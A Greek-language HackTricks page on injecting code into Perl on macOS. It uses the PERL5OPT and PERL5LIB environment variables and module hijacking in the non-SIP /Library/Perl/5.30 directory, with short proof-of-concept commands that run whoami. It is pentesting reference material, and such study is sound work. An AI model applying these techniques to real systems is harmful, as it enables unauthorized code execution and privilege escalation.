# macOS Perl Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Μέσω της μεταβλητής περιβάλλοντος `PERL5OPT` & `PERL5LIB`

Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος PERL5OPT είναι δυνατόν να εκτελούνται αυθαίρετες εντολές από το perl.\
Για παράδειγμα, δημιουργήστε αυτό το σενάριο:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Τώρα **εξάγετε τη μεταβλητή env** και εκτελέστε το **perl** σενάριο:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Μια άλλη επιλογή είναι να δημιουργήσετε ένα module Perl (π.χ. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Και στη συνέχεια χρησιμοποιήστε τις μεταβλητές περιβάλλοντος:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Μέσω εξαρτήσεων

Είναι δυνατή η καταγραφή της σειράς φακέλων εξαρτήσεων που εκτελεί το Perl:
```bash
perl -e 'print join("\n", @INC)'
```
Που θα επιστρέψει κάτι σαν:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Ορισμένοι από τους επιστρεφόμενους φακέλους δεν υπάρχουν καν, ωστόσο, **`/Library/Perl/5.30`** **υπάρχει**, **δεν** είναι **προστατευμένος** από **SIP** και είναι **πριν** από τους φακέλους **που προστατεύονται από SIP**. Επομένως, κάποιος θα μπορούσε να εκμεταλλευτεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε σενάρια εκεί, έτσι ώστε ένα σενάριο Perl υψηλής προνομιακής πρόσβασης να το φορτώσει.

{% hint style="warning" %}
Ωστόσο, σημειώστε ότι **χρειάζεται να είστε root για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτήν την **προτροπή TCC**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Για παράδειγμα, αν ένα σενάριο εισάγει **`use File::Basename;`**, θα ήταν δυνατό να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελεί αυθαίρετο κώδικα.

## Αναφορές

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
